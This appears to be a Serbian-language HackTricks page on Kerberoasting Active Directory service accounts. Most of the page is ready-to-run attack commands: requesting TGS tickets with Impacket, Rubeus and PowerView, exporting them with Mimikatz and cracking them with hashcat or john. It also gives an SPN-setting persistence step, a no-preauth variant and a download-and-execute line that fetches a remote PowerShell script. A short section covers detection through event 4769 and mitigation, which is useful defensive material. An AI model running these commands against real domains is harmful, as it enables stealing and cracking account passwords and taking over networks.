# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kerberoast

Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih koje se odnose na servise koji funkcionišu pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računarske naloge**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, omogućavajući mogućnost **offline pucanja lozinki**. Korišćenje korisničkog naloga kao servisa naznačeno je nepraznim svojstvom **"ServicePrincipalName"**.

Za izvođenje **Kerberoasting-a**, neophodan je domenski nalog sposoban zahtevanja **TGS karata**; međutim, ovaj proces ne zahteva **posebne privilegije**, što ga čini dostupnim svima sa **validnim domenskim akreditacijama**.

### Ključne tačke:

* **Kerberoasting** cilja **TGS karte** za **servise sa korisničkim nalozima** unutar **AD**.
* Karte enkriptovane ključevima od **korisničkih lozinki** mogu se **pucati offline**.
* Servis je identifikovan svojstvom **ServicePrincipalName** koje nije null.
* Nisu potrebne **posebne privilegije**, samo **validne domenske akreditacije**.

### **Napad**

{% hint style="warning" %}
**Alati za Kerberoasting** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i pokretanja TGS-REQ zahteva. To je zato što je **RC4** [**slabiji**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i lakši za pucanje offline korišćenjem alata poput Hashcat-a od drugih enkripcionih algoritama poput AES-128 i AES-256.\
RC4 (tip 23) heševi počinju sa **`$krb5tgs$23$*`** dok AES-256 (tip 18) počinju sa **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```

Višefunkcionalni alati uključujući dump korisnika koji su podložni Kerberoast napadu:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

* **Nabraj korisnike koji su podložni Kerberoast napadu**

```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

* **Tehnika 1: Zatražite TGS i izvucite ga iz memorije**

```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

* **Tehnika 2: Automatski alati**

```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

{% hint style="warning" %}
Kada se zatraži TGS, generiše se Windows događaj `4769 - Zatražen je Kerberos servisni tiket`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako kreirate i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Krekovanje

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Upornost

Ako imate **dovoljno dozvola** nad korisnikom, možete ga **učiniti podložnim za kerberoast**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

Možete pronaći korisne **alate** za napade **kerberoast** ovde: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Ako naiđete na ovu **grešku** sa Linuxa: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** to je zbog lokalnog vremena, treba sinhronizovati računar sa DC. Postoje nekoliko opcija:

* `ntpdate <IP of DC>` - Zastarelo od Ubuntu 16.04
* `rdate -n <IP of DC>`

### Otklanjanje

Kerberoasting može biti sproveden sa visokim stepenom prikrivenosti ako je iskoristiv. Da bi se otkrila ova aktivnost, pažnja treba da se obrati na **Security Event ID 4769**, što ukazuje da je zatražen Kerberos tiket. Međutim, zbog visoke frekvencije ovog događaja, specifični filteri moraju biti primenjeni kako bi se izolovala sumnjiva aktivnost:

* Ime servisa ne bi trebalo da bude **krbtgt**, jer je ovo normalan zahtev.
* Imena servisa koja se završavaju sa **$** treba isključiti kako bi se izbegli računi mašina korišćeni za servise.
* Zahtevi sa mašina treba filtrirati isključivanjem imena naloga u formatu **machine@domain**.
* Razmatraju se samo uspešni zahtevi za tiket, identifikovani sa kodom greške **'0x0'**.
* **Najvažnije**, tip enkripcije tiketa treba da bude **0x17**, što se često koristi u napadima Kerberoastinga.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

Za ublažavanje rizika od Kerberoastinga:

* Osigurati da su **Lozinke servisnih naloga teške za pogoditi**, preporučujući dužinu od više od **25 karaktera**.
* Koristiti **Upravljane servisne naloge**, koji nude prednosti poput **automatske promene lozinke** i **delegiranog upravljanja imenima servisnih principala (SPN)**, poboljšavajući sigurnost protiv takvih napada.

Implementiranjem ovih mera, organizacije mogu značajno smanjiti rizik povezan sa Kerberoastingom.

## Kerberoast bez naloga domena

U **septembru 2022.**, novi način iskorišćavanja sistema je otkriven od strane istraživača po imenu Charlie Clark, podeljen preko njegove platforme [exploit.ph](https://exploit.ph/). Ovaj metod omogućava sticanje **Servisnih karata (ST)** putem zahteva **KRB\_AS\_REQ**, što značajno ne zahteva kontrolu nad bilo kojim nalogom Active Directory-a. U osnovi, ako je princip postavljen na način da ne zahteva preautentikaciju - scenario sličan onome što je poznato u oblasti sajber bezbednosti kao **AS-REP Roasting napad** - ovu karakteristiku je moguće iskoristiti za manipulaciju procesa zahteva. Konkretno, izmenom atributa **sname** unutar tela zahteva, sistem je prevaren da izda **ST** umesto standardne šifrovane karte za dodelu karata (TGT).

Tehnika je potpuno objašnjena u ovom članku: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Morate obezbediti listu korisnika jer nemamo validan nalog za upit LDAP koristeći ovu tehniku.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py iz PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

* [GhostPack/Rubeus sa PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## Reference

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
